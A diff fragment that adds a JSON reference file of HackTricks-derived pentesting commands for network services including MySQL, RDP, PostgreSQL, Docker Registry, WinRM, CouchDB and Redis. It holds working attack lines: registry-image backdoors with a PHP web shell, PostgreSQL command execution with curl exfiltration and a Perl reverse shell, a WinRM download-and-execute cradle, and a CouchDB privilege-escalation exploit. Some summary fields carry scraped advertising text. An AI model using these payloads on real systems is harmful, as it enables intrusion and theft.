+   "summary": "Commonly used to provide remote access to mobile devices, Point-to-Point Tunneling Protocol (PPTP) uses TCP port 1723 for key exchange and IP protocol 47 (GRE) to encrypt data between peers.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/1723-pentesting-pptp.html",
+   "sections": [
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "nmap –Pn -sSV -p1723 <IP>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-mqtt-mosquitto",
+   "name": "MQTT (Mosquitto)",
+   "ports": [
+    1883
+   ],
+   "summary": "MQTT stands for MQ Telemetry Transport. It is a publish/subscribe, extremely simple and lightweight messaging protocol, designed for constrained devices and low-bandwidth, high-latency or unreliable networks. The design principles are to minimise network bandwidth and device resource requirements whilst also attempting to ensure reliability and some degree of assurance of delivery. These principle",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE                 REASON\n1883/tcp open  mosquitto version 1.4.8 syn-ack"
+     ]
+    },
+    {
+     "heading": "Pentesting MQTT",
+     "commands": [
+      "> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)\n> subscribe \"#\" 1\n> subscribe \"$SYS/#\"",
+      "apt-get install mosquitto mosquitto-clients\nmosquitto_sub -t 'test/topic' -v #Subscriribe to 'test/topic'",
+      "#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py\nimport paho.mqtt.client as mqtt\nimport time\nimport os\nHOST = \"127.0.0.1\"\nPORT = 1883\ndef on_connect(client, userdata, flags, rc):\n\tclient.subscribe('#', qos=1)\n\tclient.subscribe('$SYS/#')\ndef on_message(client, userdata, message):\n\tprint('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))\ndef main():\n\tclient = mqtt.Client()\n\tclient.on_connect = on_connect\n\tclient.on_message = on_message\n\tclient.connect(HOST, PORT)\n\tclient.loop_start()\n\t#time.sleep(10)\n\t#client.loop_stop()\nif __name__ == \"__main__\":\n\tmain()"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-nfs-service",
+   "name": "NFS Service",
+   "ports": [
+    2049
+   ],
+   "summary": "It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory. It has the same purpose as SMB but it cannot talk to SMB.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "2049/tcp open  nfs     2-3 (RPC #100003"
+     ]
+    },
+    {
+     "heading": "Useful nmap scripts",
+     "commands": [
+      "nfs-ls #List NFS exports and check permissions\nnfs-showmount #Like showmount -e\nnfs-statfs #Disk statistics and info from NFS share"
+     ]
+    },
+    {
+     "heading": "Useful metasploit modules",
+     "commands": [
+      "scanner/nfs/nfsmount #Scan NFS mounts and list permissions"
+     ]
+    },
+    {
+     "heading": "Mounting",
+     "commands": [
+      "showmount -e <IP>",
+      "mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock",
+      "mkdir /mnt/new_back\nmount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock"
+     ]
+    },
+    {
+     "heading": "Config files",
+     "commands": [
+      "/etc/exports\n/etc/lib/nfs/etab"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: NFS    #Protocol Abbreviation if there is one.\nPort_Number:  2049     #Comma separated if there is more than one.\nProtocol_Description: Network File System         #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for NFS\n  Note: |\n    It is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory.\n    #apt install nfs-common\n    showmount 10.10.10.180      ~or~showmount -e 10.10.10.180\n    should show you available shares (example /home)\n    mount -t nfs -o ver=2 10.10.10.180:/home /mnt/\n    cd /mnt\n    nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in\n    https://book.hacktricks.xyz/pentesting/nfs-service-pentesting\nEntry_2:\n  Name: Nmap\n  Description: Nmap with NFS Scripts\n  Command: nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP}"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-iscsi",
+   "name": "ISCSI",
+   "ports": [
+    3260
+   ],
+   "summary": "> In computing, iSCSI is an acronym for Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. It provides block-level access to storage devices by carrying SCSI commands over a TCP/IP network. iSCSI is used to facilitate data transfers over intranets and to manage storage over long distances. It can be used to tr",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/3260-pentesting-iscsi.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE VERSION\n3260/tcp open  iscsi?"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "nmap -sV --script=iscsi-info -p 3260 192.168.xx.xx"
+     ]
+    },
+    {
+     "heading": "Mount ISCSI on Linux",
+     "commands": [
+      "iscsiadm -m discovery -t sendtargets -p 123.123.123.123:3260\n192.168.1.2:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\n[...]",
+      "/etc/iscsi/nodes/iqn.1992-05.com.emc:fl1001433000190000-3-vnxe/192.168.1.2\\,3260\\,1/"
+     ]
+    },
+    {
+     "heading": "Manual enumeration",
+     "commands": [
+      "sudo apt-get install open-iscsi",
+      "iscsiadm -m discovery -t sendtargets -p 123.123.123.123:3260\n123.123.123.123:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\n[2a01:211:7b7:1223:211:32ff:fea9:fab9]:3260,1 iqn.2000-01.com.synology:asd3.Target-1.d0280fd382\n[fe80::211:3232:fab9:1223]:3260,1 iqn.2000-01.com.synology:Oassdx.Target-1.d0280fd382",
+      "iscsiadm -m node --targetname=\"iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\" -p 123.123.123.123:3260 --login\nLogging in to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] (multiple)\nLogin to [iface: default, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful.",
+      "iscsiadm -m node --targetname=\"iqn.1992-05.com.emc:fl1001433000190000-3-vnxe\" -p 123.123.123.123:3260 --logout\nLogging out of session [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260]\nLogout of [sid: 6, target: iqn.1992-05.com.emc:fl1001433000190000-3-vnxe, portal: 123.123.123.123,3260] successful."
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-mysql",
+   "name": "Mysql",
+   "ports": [
+    3306
+   ],
+   "summary": "RootedCON is the most relevant cybersecurity event in Spain and one of the most important in Europe. With the mission of promoting technical knowledge, this congress is a boiling meeting point for technology and cybersecurity professionals in every discipline.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "3306/tcp open  mysql"
+     ]
+    },
+    {
+     "heading": "Local",
+     "commands": [
+      "mysql -u root # Connect to root without password\nmysql -u root -p # A password will be asked (check someone)"
+     ]
+    },
+    {
+     "heading": "Remote",
+     "commands": [
+      "mysql -h <Hostname> -u root\nmysql -h <Hostname> -u root@localhost"
+     ]
+    },
+    {
+     "heading": "External Enumeration",
+     "commands": [
+      "nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>\nmsf> use auxiliary/scanner/mysql/mysql_version\nmsf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump\nmsf> use auxiliary/scanner/mysql/mysql_hashdump #Creds\nmsf> use auxiliary/admin/mysql/mysql_enum #Creds\nmsf> use auxiliary/scanner/mysql/mysql_schemadump #Creds\nmsf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds"
+     ]
+    },
+    {
+     "heading": "Write any binary data",
+     "commands": [
+      "CONVERT(unhex(\"6f6e2e786d6c55540900037748b75c7249b75\"), BINARY)\nCONVERT(from_base64(\"aG9sYWFhCg==\"), BINARY)"
+     ]
+    },
+    {
+     "heading": "MySQL arbitrary read file by client",
+     "commands": [
+      "load data local infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n';",
+      "mysql> load data infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n';\nERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement"
+     ]
+    },
+    {
+     "heading": "Mysql User",
+     "commands": [
+      "cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v \"#\" | grep \"user\"\nsystemctl status mysql 2>/dev/null | grep -o \".\\{0,0\\}user.\\{0,50\\}\" | cut -d '=' -f2 | cut -d ' ' -f1"
+     ]
+    },
+    {
+     "heading": "Privilege Escalation via library",
+     "commands": [
+      "gcc -g -c raptor_udf2.c\ngcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-rdp",
+   "name": "RDP",
+   "ports": [
+    3389
+   ],
+   "summary": "Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software (from here).",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE\n3389/tcp open  ms-wbt-server"
+     ]
+    },
+    {
+     "heading": "Automatic",
+     "commands": [
+      "nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 <IP>"
+     ]
+    },
+    {
+     "heading": "Connect with known credentials/hash",
+     "commands": [
+      "rdesktop -u <username> <IP>\nrdesktop -d <domain> -u <username> -p <password> <IP>\nxfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>\nxfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash"
+     ]
+    },
+    {
+     "heading": "Check known credentials against RDP services",
+     "commands": [
+      "rdp_check <domain>/<name>:<password>@<IP>"
+     ]
+    },
+    {
+     "heading": "Session stealing",
+     "commands": [
+      "query user",
+      "tscon <ID> /dest:<SESSIONNAME>"
+     ]
+    },
+    {
+     "heading": "Mimikatz",
+     "commands": [
+      "ts::sessions        #Get sessions\nts::remote /id:2    #Connect to the session"
+     ]
+    },
+    {
+     "heading": "Adding User to RDP group",
+     "commands": [
+      "net localgroup \"Remote Desktop Users\" UserLoginName /add"
+     ]
+    },
+    {
+     "heading": "HackTricks Automatic Commands",
+     "commands": [
+      "Protocol_Name: RDP    #Protocol Abbreviation if there is one.\nPort_Number:  3389     #Comma separated if there is more than one.\nProtocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out\nEntry_1:\n  Name: Notes\n  Description: Notes for RDP\n  Note: |\n    Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software\n    https://book.hacktricks.xyz/pentesting/pentesting-rdp\nEntry_2:\n  Name: Nmap\n  Description: Nmap with RDP Scripts\n  Command: nmap --script \"rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info\" -p 3389 -T4 {IP}"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-cisco-smart-install",
+   "name": "Cisco Smart Install",
+   "ports": [
+    4786
+   ],
+   "summary": "Cisco Smart Install is a Cisco designed to automate the initial configuration and loading of an operating system image for new Cisco hardware. By default, Cisco Smart Install is active on Cisco hardware and uses the transport layer protocol, TCP, with port number 4786.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/4786-cisco-smart-install.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT      STATE  SERVICE\n4786/tcp  open   smart-install"
+     ]
+    },
+    {
+     "heading": "Smart Install Exploitation Tool",
+     "commands": [
+      "~/opt/tools/SIET$ sudo python2 siet.py -g -i 10.10.100.10"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-docker-registry",
+   "name": "Docker Registry",
+   "ports": [
+    5000
+   ],
+   "summary": "Info from here.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "docker pull my-registry:9000/foo/bar:2.1",
+      "docker pull foo/bar",
+      "PORT    STATE SERVICE  VERSION\n5000/tcp open  http    Docker Registry (API: 2.0)"
+     ]
+    },
+    {
+     "heading": "HTTP/HTTPS",
+     "commands": [
+      "curl -s http://10.10.10.10:5000/v2/_catalog\n#If HTTPS\nWarning: Binary output can mess up your terminal. Use \"--output -\" to tell\nWarning: curl to output it to your terminal anyway, or consider \"--output\nWarning: <FILE>\" to save to a file.\n#If HTTP\n{\"repositories\":[\"alpine\",\"ubuntu\"]}"
+     ]
+    },
+    {
+     "heading": "Authentication",
+     "commands": [
+      "curl -k https://192.25.197.3:5000/v2/_catalog\n#If Authentication required\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"authentication required\",\"detail\":[{\"Type\":\"registry\",\"Class\":\"\",\"Name\":\"catalog\",\"Action\":\"*\"}]}]}\n#If no authentication required\n{\"repositories\":[\"alpine\",\"ubuntu\"]}",
+      "curl -k -u username:password https://10.10.10.10:5000/v2/_catalog"
+     ]
+    },
+    {
+     "heading": "Enumeration using docker",
+     "commands": [
+      "#Once you know which images the server is saving (/v2/_catalog) you can pull them\ndocker pull 10.10.10.10:5000/ubuntu\n#Check the commands used to create the layers of the image\ndocker history 10.10.10.10:5000/ubuntu\n#IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT\n#ed05bef01522        2 years ago         ./run.sh                                        46.8MB\n#<missing>           2 years ago         /bin/sh -c #(nop)  CMD [\"./run.sh\"]             0B\n#<missing>           2 years ago         /bin/sh -c #(nop)  EXPOSE 80                    0B\n#<missing>           2 years ago         /bin/sh -c cp $base/mysql-setup.sh /            499B\n#<missing>           2 years ago         /bin/sh -c #(nop) COPY dir:0b657699b1833fd59…   16.2MB\n#Run and get a shell\ndocker run -it 10.10.10.10:5000/ubuntu bash #Leave this shell running\ndocker ps #Using a different shell\ndocker exec -it 7d3a81fe42d7 bash #Get ash shell inside docker container"
+     ]
+    },
+    {
+     "heading": "Backdooring WordPress image",
+     "commands": [
+      "<?php echo shell_exec($_GET[\"cmd\"]); ?>",
+      "FROM 10.10.10.10:5000/wordpress\nCOPY shell.php /app/\nRUN chmod 777 /app/shell.php",
+      "docker build -t 10.10.10.10:5000/wordpress .\n #Create\ndocker images\ndocker push registry:5000/wordpress #Push it"
+     ]
+    },
+    {
+     "heading": "Backdooring SSH server image",
+     "commands": [
+      "docker pull 10.10.10.10:5000/sshd-docker-cli\ndocker run -d 10.10.10.10:5000/sshd-docker-cli",
+      "docker cp 4c989242c714:/etc/ssh/sshd_config .",
+      "FROM 10.10.10.10:5000/sshd-docker-cli\nCOPY sshd_config /etc/ssh/\nRUN echo root:password | chpasswd",
+      "docker build -t 10.10.10.10:5000/sshd-docker-cli .\n #Create\ndocker images\ndocker push registry:5000/sshd-docker-cli #Push it"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-postgresql",
+   "name": "Postgresql",
+   "ports": [
+    5432,
+    5433
+   ],
+   "summary": "\\ Use Trickest to easily build and automate workflows powered by the world's most advanced community tools.\\ Get Access Today:",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE\n5432/tcp open  pgsql"
+     ]
+    },
+    {
+     "heading": "Connect",
+     "commands": [
+      "psql -U <myuser> # Open psql console with user\npsql -h <host> -U <username> -d <database> # Remote connection\npsql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "msf> use auxiliary/scanner/postgres/postgres_version\nmsf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection"
+     ]
+    },
+    {
+     "heading": "Port scanning",
+     "commands": [
+      "SELECT * FROM dblink_connect('host=1.2.3.4\n                              port=5678\n                              user=name\n                              password=secret\n                              dbname=abc\n                              connect_timeout=10');",
+      "DETAIL:  could not connect to server: Connection refused Is  the  server\nrunning on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?",
+      "DETAIL:  server closed the connection unexpectedly This  probably  means\nthe server terminated abnormally before or while processing the request",
+      "DETAIL:  FATAL:  password authentication failed for user \"name\"",
+      "DETAIL:  could not connect to server: Connection timed out Is the server\nrunning on host \"1.2.3.4\" and accepting TCP/IP connections on port 5678?"
+     ]
+    },
+    {
+     "heading": "Read file",
+     "commands": [
+      "{% hint style=\"warning\" %}\nRemember that if you aren't super user but has the **CREATEROLE** permissions you can **make yourself member of that group:**",
+      "[**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)\n{% endhint %}\nThere are **other postgres functions** that can be used to **read file or list a directory**. Only **superusers** and **users with explicit permissions** can use them:"
+     ]
+    },
+    {
+     "heading": "Simple File Writing",
+     "commands": [
+      "copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';",
+      "GRANT pg_write_server_files TO username;"
+     ]
+    },
+    {
+     "heading": "RCE to program",
+     "commands": [
+      "'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -",
+      "#PoC\nDROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;\nDROP TABLE IF EXISTS cmd_exec;\n#Reverse shell\n#Notice that in order to scape a single quote you need to put 2 single quotes\nCOPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"192.168.0.104:80\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';",
+      "GRANT pg_execute_server_program TO username;"
+     ]
+    },
+    {
+     "heading": "Modify Password",
+     "commands": [
+      "#Change password\nALTER USER user_name WITH PASSWORD 'new_password';"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-android-debug-bridge",
+   "name": "Android Debug Bridge",
+   "ports": [
+    5555
+   ],
+   "summary": "Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as installing and debugging apps, and it provides access to a Unix shell that you can use to run a variety of commands on a device. (from here)",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/5555-android-debug-bridge.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE VERSION\n5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)"
+     ]
+    },
+    {
+     "heading": "Connect",
+     "commands": [
+      "adb connect 10.10.10.10\nadb root # Try to escalate to root\nadb shell"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-vnc",
+   "name": "VNC",
+   "ports": [
+    5800,
+    5801,
+    5900,
+    5901
+   ],
+   "summary": "In computing, Virtual Network Computing (VNC) is a graphical desktop-sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another, relaying the graphical-screen updates back in the other direction, over a network.\\ From wikipedia.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-vnc.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT    STATE SERVICE\n5900/tcp open  vnc"
+     ]
+    },
+    {
+     "heading": "Enumeration",
+     "commands": [
+      "nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> <IP>\nmsf> use auxiliary/scanner/vnc/vnc_none_auth"
+     ]
+    },
+    {
+     "heading": "Connect to vnc using Kali",
+     "commands": [
+      "vncviewer [-passwd passwd.txt] <IP>::5901"
+     ]
+    },
+    {
+     "heading": "Decrypting VNC password",
+     "commands": [
+      "make\nvncpwd <vnc password file>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-couchdb",
+   "name": "CouchDB",
+   "ports": [
+    5984,
+    6984
+   ],
+   "summary": "CouchDB is a document-oriented database and within each document fields are stored as key-value maps. Fields can be either a simple key/value pair, list, or map.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/5984-pentesting-couchdb.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT      STATE SERVICE REASON\n5984/tcp  open  unknown syn-ack"
+     ]
+    },
+    {
+     "heading": "Automatic Enumeration",
+     "commands": [
+      "nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>\nmsf> use auxiliary/scanner/couchdb/couchdb_enum"
+     ]
+    },
+    {
+     "heading": "Banner",
+     "commands": [
+      "curl http://IP:5984/",
+      "{\"couchdb\":\"Welcome\",\"version\":\"0.10.1\"}\n{\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}}"
+     ]
+    },
+    {
+     "heading": "Database List",
+     "commands": [
+      "curl -X GET http://IP:5984/_all_dbs",
+      "curl -X GET http://user:password@IP:5984/_all_dbs",
+      "[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"]"
+     ]
+    },
+    {
+     "heading": "Database Info",
+     "commands": [
+      "curl http://IP:5984/<database>\ncurl http://localhost:5984/simpsons\n#Example response:\n{\"db_name\":\"simpsons\",\"update_seq\":\"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ\",\"sizes\":{\"file\":62767,\"external\":1320,\"active\":2466},\"purge_seq\":0,\"other\":{\"data_size\":1320},\"doc_del_count\":0,\"doc_count\":7,\"disk_size\":62767,\"disk_format_version\":6,\"data_size\":2466,\"compact_running\":false,\"instance_start_time\":\"0\"}"
+     ]
+    },
+    {
+     "heading": "Document List",
+     "commands": [
+      "curl -X GET http://IP:5984/{dbname}/_all_docs\ncurl http://localhost:5984/simpsons/_all_docs\n#Example response:\n{\"total_rows\":7,\"offset\":0,\"rows\":[\n{\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}},\n{\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}},\n{\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}},\n{\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}},\n{\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}},\n{\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e450844fb4\"}},\n{\"id\":\"f53679a526a868d44172c83a6100451b\",\"key\":\"f53679a526a868d44172c83a6100451b\",\"value\":{\"rev\":\"1-3f6141f3aba11da1d65ff0c13fe6fd39\"}}\n]}"
+     ]
+    },
+    {
+     "heading": "Read Document",
+     "commands": [
+      "curl -X GET http://IP:5984/{dbname}/{id}\ncurl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9\n#Example response:\n{\"_id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"_rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\",\"character\":\"Homer\",\"quote\":\"Doh!\"}"
+     ]
+    },
+    {
+     "heading": "CouchDB Privilege Escalation CVE-2017-12635",
+     "commands": [
+      "curl -X PUT -d '{\"type\":\"user\",\"name\":\"hacktricks\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"hacktricks\"}' localhost:5984/_users/org.couchdb.user:hacktricks -H \"Content-Type:application/json\""
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-winrm",
+   "name": "WinRM",
+   "ports": [
+    5985,
+    5986
+   ],
+   "summary": "Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html",
+   "sections": [
+    {
+     "heading": "Initiating WinRM Session.",
+     "commands": [
+      "Enable-PSRemoting -Force\nSet-Item wsman:\\localhost\\client\\trustedhosts *",
+      "wmic /node:<REMOTE_HOST> process call create \"powershell enable-psremoting -force\""
+     ]
+    },
+    {
+     "heading": "Execute a command",
+     "commands": [
+      "Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\\username]",
+      "Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList \"arguments\"]"
+     ]
+    },
+    {
+     "heading": "Execute a Script",
+     "commands": [
+      "Invoke-Command -ComputerName <computername> -FilePath C:\\path\\to\\script\\file [-credential CSCOU\\jarrieta]"
+     ]
+    },
+    {
+     "heading": "Get reverse-shell",
+     "commands": [
+      "Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c \"powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')\"}"
+     ]
+    },
+    {
+     "heading": "Forcing WinRM Open",
+     "commands": [
+      "PS C:\\tools\\SysinternalsSuite> .\\PsExec.exe \\\\computername -u domain\\username -p password -h -d powershell.exe \"enable-psremoting -force\""
+     ]
+    },
+    {
+     "heading": "Note the \".\\\" in the suername to indicate it's a local user (host domain)",
+     "commands": [
+      "Inside this sessions you can load PS scripts using _Invoke-Command_"
+     ]
+    },
+    {
+     "heading": "Errors",
+     "commands": [
+      "winrm quickconfig\nwinrm set winrm/config/client '@{TrustedHosts=\"Computer1,Computer2\"}'"
+     ]
+    },
+    {
+     "heading": "Using evil-winrm",
+     "commands": [
+      "gem install evil-winrm",
+      "evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-redis",
+   "name": "Redis",
+   "ports": [
+    6379
+   ],
+   "summary": "​Did you know that crypto projects pay more bounty rewards than their web2 counterparts?\\ This crypto bounty alone is worth $1.000.000!\\ Check out the top-paying bounties among crypto projects.\\ Sign up on HackenProof to get rewarded without delays and become the web3 hacker legend.",
+   "reference": "https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html",
+   "sections": [
+    {
+     "heading": "Basic Information",
+     "commands": [
+      "PORT     STATE SERVICE  VERSION\n6379/tcp open  redis   Redis key-value store 4.0.9"
+     ]
+    },
+    {
+     "heading": "Automatic Enumeration",
+     "commands": [
+      "nmap --script redis-info -sV -p 6379 <IP>\nmsf> use auxiliary/scanner/redis/redis_server"
+     ]
+    },
+    {
+     "heading": "Banner",
+     "commands": [
+      "nc -vn 10.10.10.10 6379\nredis-cli -h 10.10.10.10 # sudo apt-get install redis-tools",
+      "-NOAUTH Authentication required."
+     ]
+    },
+    {
+     "heading": "Redis Authentication",
+     "commands": [
+      "AUTH <username> <password>"
+     ]
+    },
+    {
+     "heading": "Authenticated enumeration",
+     "commands": [
+      "INFO\n[ ... Redis response with info ... ]\nclient list\n[ ... Redis response with connected clients ... ]\nCONFIG GET *\n[ ... Get config ... ]",
+      "rename-command FLUSHDB \"\""
+     ]
+    },
+    {
+     "heading": "Dumping Database",
+     "commands": [
+      "INFO keyspace",
+      "SELECT 1\n[ ... Indicate the database ... ]\nKEYS *\n[ ... Get Keys ... ]\nGET <KEY>\n[ ... Get Key ... ]",
+      "TYPE <KEY>\n[ ... Type of the Key ... ]\nLRANGE <KEY> 0 -1\n[ ... Get list items ... ]\nHGET <KEY> <FIELD>\n[ ... Get hash item ... ]"
+     ]
+    },
+    {
+     "heading": "Interactive Shell",
+     "commands": [
+      "./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>"
+     ]
+    },
+    {
+     "heading": "PHP Webshell",
+     "commands": [
+      "root@Urahara:~# redis-cli -h 10.85.0.52\n10.85.0.52:6379> config set dir /usr/share/nginx/html\nOK\n10.85.0.52:6379> config set dbfilename redis.php\nOK\n10.85.0.52:6379> set test \"<?php phpinfo(); ?>\"\nOK\n10.85.0.52:6379> save\nOK"
+     ]
+    }
+   ]
+  },
+  {
+   "key": "ht-apache-jserv-protocol-ajp",
+   "name": "Apache JServ Protocol (AJP)",
+   "ports": [
+    8009
+   ],
